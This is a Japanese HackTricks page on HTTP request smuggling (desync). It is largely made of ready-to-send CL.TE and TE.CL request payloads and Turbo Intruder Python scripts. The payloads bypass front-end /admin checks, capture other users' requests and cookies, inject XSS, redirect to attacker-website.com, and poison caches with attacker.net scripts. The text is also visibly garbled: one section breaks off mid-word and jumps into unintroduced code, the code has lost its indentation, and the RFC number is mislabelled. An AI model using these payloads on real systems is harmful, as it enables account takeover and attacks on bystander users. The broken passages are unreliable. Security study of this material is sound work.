# HTTP リクエストスマグリング / HTTP デシンク攻撃

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝**したい場合や **HackTricks を PDF でダウンロード**したい場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェック！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
* **💬 [Discord グループ](https://discord.gg/hRep4RUj7f)** に参加するか、[telegram グループ](https://t.me/peass) に参加するか、**Twitter** 🐦 で **@carlospolopm** をフォローする
* **ハッキングトリックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の GitHub リポジトリに PR を提出する

</details>

## 何を指すか

この脆弱性は、**フロントエンドプロキシ**と**バックエンド**サーバの間の**非同期化**により、**攻撃者**が**フロントエンド**プロキシ（ロードバランス/リバースプロキシ）によって**1つのリクエスト**として**解釈**され、**バックエンド**サーバによって**2つのリクエスト**として**解釈**されるHTTP **リクエスト**を**送信**できるようにします。\
これにより、ユーザーは**自分の後に到着する次のリクエストを変更**できます。

### 理論

[**RFC 仕様（2161）**](https://tools.ietf.org/html/rfc2616)

> メッセージに Transfer-Encoding ヘッダーフィールドと Content-Length ヘッダーフィールドの両方が含まれる場合、後者は無視される必要があります。

**Content-Length**

> Content-Length エンティティヘッダーは、受信者に送信されるエンティティボディのサイズ（バイト単位）を示します。

**Transfer-Encoding: chunked**

> Transfer-Encoding ヘッダーは、ペイロードボディを安全にユーザーに転送するために使用されるエンコーディング形式を指定します。\
> Chunked は、大きなデータがチャンクのシリーズで送信されることを意味します。

### 現実

**フロントエンド**（ロードバランス/リバースプロキシ）は _**content-length**_ または _**transfer-encoding**_ ヘッダーを処理し、**バックエンド**サーバは**もう一方**を処理して、2つのシステムの間に**非同期化**を引き起こします。\
これは、**攻撃者がリバースプロキシに1つのリクエストを送信**し、**バックエンド**サーバがそれを**2つの異なるリクエスト**として解釈することができるため、非常に重大です。この技術の危険性は、**バックエンド**サーバが**注入された2番目のリクエスト**を**次のクライアントから来たものとして解釈**し、そのクライアントの**実際のリクエスト**が**注入されたリクエスト**の一部として含まれる可能性があることにあります。

### 特異点

HTTP では、**改行文字は2バイトで構成される**ことを覚えておいてください:

* **Content-Length**: このヘッダーは、リクエストのボディのバイト数を示す **10進数** を使用します。ボディは最後の文字で終了することが期待されており、**リクエストの末尾に改行は必要ありません**。
* **Transfer-Encoding:** このヘッダーは、**次のチャンクのバイト数**を示す **16進数** を **ボディ**で使用します。**チャンク**は **改行で終了**する必要がありますが、この改行は **長さ指示子には含まれません**。この転送方法は、**サイズ0のチャンクに続く2つの改行で終了**する必要があります: `0`
* **Connection**: 私の経験に基づいて、リクエストスマグリングの最初のリクエストで **`Connection: keep-alive`** を使用することをお勧めします。

## 基本的な例

したがって、リクエストスマグリング攻撃は、`Content-Length` ヘッダーと `Transfer-Encoding` ヘッダーの両方を単一のHTTPリクエストに配置し、これらを操作してフロントエンドとバックエンドサーバがリクエストを異なる方法で処理するようにします。これを行う具体的な方法は、2つのサーバの動作に依存します:

* **CL.TE**: フロントエンドサーバが `Content-Length` ヘッダーを使用し、バックエンドサーバが `Transfer-Encoding` ヘッダーを使用します。
* **TE.CL**: フロントエンドサーバが `Transfer-Encoding` ヘッダーを使用し、バックエンドサーバが `Content-Length` ヘッダーを使用します。
* **TE.TE**: フロントエンドサーバとバックエンドサーバの両方が `Transfer-Encoding` ヘッダーをサポートしていますが、サーバの1つはヘッダーを何らかの方法で曖昧化して処理しないように誘導できます。

### CL.TE 脆弱性

ここでは、**フロントエンド**サーバが **`Content-Length`** ヘッダーを使用し、**バックエンド**サーバが **`Transfer-Encoding`** ヘッダーを使用します。次のように簡単なHTTPリクエストスマグリング攻撃を実行できます:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 30`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /404 HTTP/1.1`\
`Foo: x`

`Content-Length` が **ボディのリクエスト長が30バイト**であることを示していることに注意してください（HTTPでは改行として2バイトが使用されるため）。したがって、リバースプロキシは **完全なリクエストをバックエンドに送信**し、バックエンドは `Transfer-Encoding` ヘッダーを処理して `GET /404 HTTP/1.1` を **次のリクエストの先頭**として処理します（ちなみに、次のリクエストは `Foo:x<次のリクエストはここから開始>` に追加されます）。

### TE.CL 脆弱性

ここでは、**フロントエンド**サーバが **`Transfer-Encoding`** ヘッダーを使用し、**バックエンド**サーバが **`Content-Length`** ヘッダーを使用します。次のように簡単なHTTPリクエストスマグリング攻撃を実行できます:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 4`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `7b`\ `GET /404 HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 30`\``\
`x=`\
`0`\
`\`

この場合、**リバースプロキシ**は**リクエスト全体を** **バックエンドに送信**します（`Transfer-encoding` がそう指示しているため）。しかし、**バックエンド**は `Content-Length` で指定された **`7b`**（4バイト）のみを処理します。したがって、次のリクエストは `GET /404 HTTP/1.1` から始まるリクエストになります。

_攻撃が `0` で終了する必要があるため、次のリクエストは **x** パラメータの追加値として追加されます。_\
_埋め込まれたリクエストの Content-Length が次のリクエストの長さを示すため、次のリクエストが **x** パラメータに追加されるバイト数が少ないと、追加されるバイト数が少なくなり、次のリクエストの長さよりも大きい場合（次のリクエストの長さよりも大きい場合）、次のリクエストに対してエラーが発生します。_

### TE.TE 脆弱性

ここでは、フロントエンドサーバとバックエンドサーバの両方が `Transfer-Encoding` ヘッダーをサポートしていますが、サーバの1つがヘッダーを何らかの方法で処理しないように誘導できます。\
`Transfer-Encoding` ヘッダーを曖昧化する方法は無限にあります。例:

`Transfer-Encoding: xchunked`\
``\ `Transfer-Encoding : chunked`\``\
`Transfer-Encoding: chunked`\
`Transfer-Encoding: x`\
``\ `Transfer-Encoding: chunked`\ `Transfer-encoding: x`\``\
`Transfer-Encoding:[tab]chunked`\
``\ `[space]Transfer-Encoding: chunked`\``\
`X: X[\n]Transfer-Encoding: chunked`\
\`\`\
`Transfer-Encoding`\
`: chunked`

**TE** ヘッダーの処理を停止するサーバ（リバースプロキシまたはバックエンド）によって、**CL.TE脆弱性**または**TE.CL脆弱性**が見つかります。

## HTTP リクエストスマグリングの発見

### タイミング技術を使用して CL.TE 脆弱性を見つける

アプリケーションがリクエストスマグリングの CL.TE バリアントに脆弱である場合、次のようなリクエストを送信すると、通常、時間の遅延が発生します:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
フロントエンドサーバーは `Content-Length` ヘッダーを使用しているため、このリクエストの一部のみを転送し、`0` を省略します。 バックエンドサーバーは `Transfer-Encoding` ヘッダーを使用し、最初のチャンクを処理した後、次のチャンクの到着を待ちます。 これにより、観測可能な時間遅延が発生します。

タイムアウトではなく、400 Bad Requestを受け取ることがある場合もあります。次のシナリオのように、CL.TE ペイロードが送信された場合です:

![](<../../.gitbook/assets/image (444).png>)

そして、応答は、haproxyのバージョンさえ含むエラーを本文に含むリダイレクトです:

![](<../../.gitbook/assets/image (443).png>)

### タイミングテクニックを使用して TE.CL 脆弱性を見つける

アプリケーションが TE.CL バリアントのリクエストスムグリングに脆弱である場合、次のようなリクエストを送信すると、しばしば時間遅延が発生します:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
フロントエンドサーバーが `Transfer-Encoding` ヘッダーを使用しているため、このリクエストの一部のみを転送し、`X` を省略します。バックエンドサーバーは `Content-Length` ヘッダーを使用し、メッセージ本文にさらにコンテンツがあることを期待し、残りのコンテンツが到着するのを待ちます。これにより、観察可能な時間遅延が発生します。

### HTTPリクエストスムグリング脆弱性の探査

**タイミングテクニックが機能していること**を見つけたら、**他のクライアントのリクエストを変更できるかどうかを調査**する必要があります。\
これを行う最も簡単な方法は、自分自身のリクエストを毒化し、たとえば `/` に対して404を返すリクエストを行うことです。\
[基本例](./#basic-examples)では、`CL.TE` と `TE.CL` の例をすでに見て、クライアントのリクエストを毒化して `/404` を要求させ、クライアントが他のリソースを要求しているときに404レスポンスを引き起こす方法を見ました。

**注意事項**

他のリクエストに干渉してリクエストスムグリングの脆弱性を確認しようとする際には、いくつか重要な考慮事項を心に留めておく必要があります：

* "攻撃" リクエストと "通常" リクエストは異なるネットワーク接続を使用してサーバーに送信する必要があります。同じ接続を介して両方のリクエストを送信すると、脆弱性が存在することを証明できません。
* "攻撃" リクエストと "通常" リクエストは、可能な限り同じURLとパラメータ名を使用する必要があります。多くの現代のアプリケーションは、URLとパラメータに基づいてフロントエンドリクエストを異なるバックエンドサーバーにルーティングします。同じURLとパラメータを使用することで、リクエストが同じバックエンドサーバーで処理される可能性が高まり、攻撃が機能するためには重要です。
* "通常" リクエストをテストして "攻撃" リクエストからの干渉を検出する際には、アプリケーションが同時に受信している他のリクエスト（他のユーザーからのリクエストを含む）と競合しています。 "通常" リクエストは "攻撃" リクエストの直後に送信する必要があります。アプリケーションがビジーな場合、脆弱性を確認するために複数の試行が必要になるかもしれません。
* 一部のアプリケーションでは、フロントエンドサーバーがロードバランサーとして機能し、いくつかのロードバランシングアルゴリズムに従ってリクエストを異なるバックエンドシステムに転送します。 "攻撃" リクエストと "通常" リクエストが異なるバックエンドシステムに転送される場合、攻撃は失敗します。これは、脆弱性を確認するために複数回試行する必要がある追加の理由です。
* 攻撃が後続のリクエストに干渉して成功した場合、これが干渉を検出するために送信した "通常" リクエストではなかった場合、他のアプリケーションユーザーが攻撃の影響を受けたことを意味します。テストを継続すると、他のユーザーに混乱をもたらす可能性があり、注意が必要です。

### ホップバイホップヘッダーを介した強制

ホップバイホップヘッダーを悪用することで、プロキシにヘッダー `Content-Length` または `Transfer-Encoding` を削除するよう指示し、HTTPリクエストスムグリングを悪用することが可能になります。
```
Connection: Content-Length
```
## HTTPリクエストスマグリングの悪用

### フロントエンドセキュリティコントロールをバイパスするために

**フロントエンドプロキシは時々セキュリティチェックを実行**します。これらを回避するためにHTTPリクエストスマグリングを悪用することで、**保護をバイパス**できます。例えば、この例では、**外部から`/admin`にアクセスできません**し、フロントエンドプロキシがそれをチェックしていますが、**このプロキシは埋め込まれたリクエストをチェックしていません**：

**CL.TE**

`POST / HTTP/1.1`\
`Host: acb21fdd1f98c4f180c02944000100b5.web-security-academy.net`\
`Cookie: session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr`\
`Connection: keep-alive`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 67`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`Content-Length: 10`\
\`\`\
`x=`

**TE.CL**

`POST / HTTP/1.1`\
`Host: ace71f491f52696180f41ed100d000d4.web-security-academy.net`\
`Cookie: session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 4`\
`Transfer-Encoding: chunked`\
`2b`\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`a=x`\
`0`\
`\`

### フロントエンドリクエストの書き換えを明らかにする<a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

多くのアプリケーションでは、**フロントエンドサーバーはリクエストをバックエンドサーバーに転送する前にリクエストの書き換えを行います**。通常、いくつかの追加のリクエストヘッダーを追加することにより行います。\
一般的に行うことの1つは、リクエストに`X-Forwarded-For: <クライアントのIP>`のヘッダーを**追加する**ことです。\
時々、リクエストに追加される**新しい値を見つける**ことができれば、**保護をバイパス**し、**隠された情報**/**エンドポイントにアクセス**できるかもしれません。

リクエストの書き換え方法を発見するには、バックエンドがその値を反映するPOSTパラメータを見つける必要があります。その後、このパラメータを最後に使用し、次のようなエクスプロイトを使用します：

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 130`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
`0`\
``\ `POST /search HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 100`\``\
`search=`

この場合、次のリクエストは`search=`の後に追加されます。これはまた、**レスポンスで反映される値**であるパラメータです。したがって、**次のリクエストのヘッダーが反映**されます。

**埋め込まれたリクエストの`Content-Length`ヘッダーで指定された長さだけが反映**されることに注意してください。小さい数値を使用すると、数バイトだけが反映され、すべてのヘッダーよりも大きな数値を使用すると、埋め込まれたリクエストがエラーをスローします。そのため、**小さい数値**から始めて、見たいすべての内容が表示されるまで**数値を増やしていきます**。\
また、この**テクニックはTE.CL**の脆弱性でも悪用できますが、リクエストは`search=\r\n0`で終了する必要があります。ただし、改行文字に関係なく、値は検索パラメータに追加されます。

最後に、この攻撃では、フロントエンドプロキシがリクエストをどのように書き換えているかを学ぶために自分自身を攻撃していることに注意してください。

### 他のユーザーのリクエストをキャプチャする<a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

1つのパラメータの内容を保存するPOSTリクエストを見つけることができれば、そのパラメータの値として次のリクエストを追加して、次のクライアントのリクエストを保存できます：

`POST / HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 319`\
`Connection: keep-alive`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`POST /post/comment HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Length: 659`\
`Content-Type: application/x-www-form-urlencoded`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
\`\`\
`csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=HACKTRICKS&email=email%40email.com&comment=`

この場合、**パラメータcomment**の値は、ページ内のコメントに**保存**されます。そのため、次のリクエストの内容が含まれたコメントが表示されます。

_このテクニックの制限の1つは、通常、スマグルされたリクエストに適用されるパラメータ区切り記号までのデータのみがキャプチャされることです。URLエンコードされたフォーム送信の場合、これは`&`文字になり、被害者ユーザーのリクエストから保存されるコンテンツは最初の`&`で終了します。_

また、この**テクニックはTE.CL**の脆弱性でも悪用できますが、リクエストは`search=\r\n0`で終了する必要があります。ただし、改行文字に関係なく、値は検索パラメータに追加されます。

### 反射型XSSを悪用するためのHTTPリクエストスマグリングの使用

Webページが**反射型XSSに脆弱**である場合、HTTPリクエストスマグリングを悪用してWebのクライアントを攻撃できます。HTTPリクエストスマグリングからの反射型XSSの利用にはいくつかの利点があります：

* **被害者ユーザーとのやり取りが不要**
* 通常の反射型XSS攻撃では**簡単に制御できないリクエストの一部でXSSの動作を悪用**できます。例えば、HTTPリクエストヘッダーなど。

WebがUser-Agentヘッダーで反射型XSSに脆弱である場合、次のペイロードを使用してそれを悪用できます：

`POST / HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0`\
`Cookie: session=Ro7YknOtbl3bxURHAAxZz84qj3PSMnSY`\
`Transfer-Encoding: chunked`\
`Connection: keep-alive`\
`Content-Length: 213`\
`Content-Type: application/x-www-form-urlencoded`\
``\ `0`\``\
`GET /post?postId=2 HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: "><script>alert(1)</script>`\
`Content-Length: 10`\
`Content-Type: application/x-www-form-urlencoded`\
\`\`\
`A=`

### オンサイトリダイレクトをオープンリダイレクトに変換するためのHTTPリクエストスマグリングの使用<a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

多くのアプリケーションは、1つのURLから別のURLにオンサイトリダイレクトを実行し、リクエストの`Host`ヘッダーからホスト名をリダイレクトURLに配置します。これは、ApacheやIIS Webサーバーのデフォルト動作の例であり、スラッシュで終わらないフォルダのリクエストは、スラッシュを含む同じフォルダにリダイレクトされます：

`GET /home HTTP/1.1`\
`Host: normal-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://normal-website.com/home/`

この動作は通常無害ですが、リクエストスマグリング攻撃で他のユーザーを外部ドメインにリダイレクトすることができます。例：

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 54`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: X`

スマグルされたリクエストは、攻撃者のWebサイトにリダイレクトされ、バックエンドサーバーによって処理される次のユーザーのリクエストに影響を与えます。例：

`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: XGET /scripts/include.js HTTP/1.1`\
`Host: vulnerable-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://attacker-website.com/home/`

ここでは、ユーザーのリクエストはWebサイトのページでインポートされたJavaScriptファイルを要求していました。攻撃者は、レスポンスで自分自身のJavaScriptを返すことで、被害者ユーザーを完全に妨害できます。

### Webキャッシュポイズニングを実行するためのHTTPリクエストスマグリングの使用<a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

**フロントエンドインフラストラクチャの一部がコンテンツのキャッシュを実行**している場合（通常はパフォーマンス上の理由）、**サーバーの応答を変更してそのキャッシュを毒化**することができるかもしれません。

サーバーからの期待される返される値を404に変更する方法はすでに見てきました（[基本例](./#basic-examples)）。同様に、**毒化されたリクエストが`/static/include.js`を要求すると、サーバーは`/index.html`のコンテンツを返すようになります**。これにより、`/static/include.js`のコンテンツが`/index.html`のコンテンツでキャッシュされ、クライアントが`/static/include.js`にアクセスできなくなります（DoS？）。

**Open Redirect**または**オンサイトリダイレクトからオープンリダイレクト**（最後のセクション）を見つけると、さらに興味深くなります。なぜなら、`/static/include.js`のキャッシュ値を**自分が制御するスクリプトの値**で**変更**できるからです（`/static/include.js`の新しいバージョンをダウンロードしようとするすべてのクライアントに**一般的なXSSを提供**する）。

この例では、**キャッシュポイズニング+オンサイトリダイレクトからオープンリダイレクト**を悪用して、`/static/include.js`のキャッシュ内容を**攻撃者が制御するスクリプトの内容**で提供する方法を示します：

`POST / HTTP/1.1`\
`Host: vulnerable.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 124`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /post/next?postId=3 HTTP/1.1`\
`Host: attacker.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 10`\
\`\`\
`x=1`

埋め込まれたリクエストが`/post/next?postId=3`を要求していることに注意してください。このリクエストは`/post?postId=4`にリダイレクトされ、**Hostヘッダーの値**を使用してドメインを示します。したがって、**Hostヘッダーを変更**して攻撃者のサーバーを指すようにし、リダイレクトがそのドメインを使用するようにします（**オンサイトリダイレクトからオープンリダイレクト**）。

その後、**ソケットを毒化**した後、**`/static/include.js`**に**GETリクエスト**を送信する必要があります。このリクエストは**オンサイトリダイレクトからオープンリダイレクト**リクエストによって**毒され**、**攻撃者が制御するスクリプトの内容**を**取得**します。

次に、誰かが`/static/include.js`を要求すると、攻撃者のスク
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

From: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## 詳細

![こちらから](https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104)

## ツール

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): このツールは文法ベースのHTTP Fuzzerであり、奇妙なリクエストスマグリングの不一致を見つけるのに役立ちます。

## 参考文献

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
